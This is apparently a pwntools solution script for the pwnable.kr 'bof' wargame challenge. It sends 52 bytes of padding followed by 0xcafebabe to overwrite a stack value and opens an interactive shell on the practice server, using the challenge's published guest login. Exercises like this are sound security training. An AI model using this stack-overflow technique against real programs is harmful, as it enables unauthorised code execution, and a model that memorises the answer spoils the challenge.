from pwn import *

p = 0
if args.LOCAL:
    p = process('./bof')
else:
    ses = ssh(user='bof', host='pwnable.kr', port=2222, password='guest')
    p = ses.process(['nc', '0', '9000'])

payload = 52*b'a' + p32(0xcafebabe)
p.sendline(payload)
p.interactive()
